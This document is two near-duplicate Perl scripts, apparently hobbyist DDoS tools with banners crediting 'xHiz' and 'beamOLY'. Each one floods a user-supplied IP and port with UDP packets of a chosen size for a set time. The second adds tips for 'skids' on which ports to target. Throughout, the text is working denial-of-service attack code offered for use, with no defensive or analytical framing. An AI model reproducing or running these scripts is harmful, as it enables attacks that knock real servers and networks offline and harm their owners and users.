#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3) {
  system("clear || cls");
#Script Banner================================================================
print q{
  ===============================================================================
                                 ATTACK DOOS NETHOME-NETVPS-NETFIBER BY:xHiz                             
  ===============================================================================

             > FB : Kritt Korn <
 };
# INPUT TARGET INFO ==============================================
 print " \n";
 print "DDOS NET FIBER:) // \n\n";
 print "Commande: perl XDos.pl <IP> <PORT> <300> <TIME>\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Impossible de se connecter ร  $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print  "START ATTACK IP $ip
START ATTACK port " . ($port ? $port : "random"). " \n";

print " \n";
print  "ATTACK DONE BY:xHiz...\n";
print "Attaque arrรชtรฉe avec Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}







#!/usr/bin/perl

#Created by ~beamOLY
#Reccomendations (For skids): 
#IP -   Don't DDoS Government Websites.
#Port - Use '80' for HTTP (Most Common) or '53' for DNS or '443' for https.
#Size - Use '100 - 1000' (Reccomended).
#Time - Depending on the bandwith of your server, use how ever much you want (You can always press Ctrl-C to cancel).
 
use Socket;
use strict;

print'
Attack Success!

FB : Kritt Kron

By : xHiz
';
print"\n";

if ($#ARGV != 3) {
  print "\n\t\t\t***Error command must recieve four arguements***\n";
  print "-Ex) perl DDoS.pl 1.1.1.1 80 1000 300\n";
  print "-Therefore DDoSing the IP '1.1.1.1' for '300' seconds on port '80' using '1000' packets\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
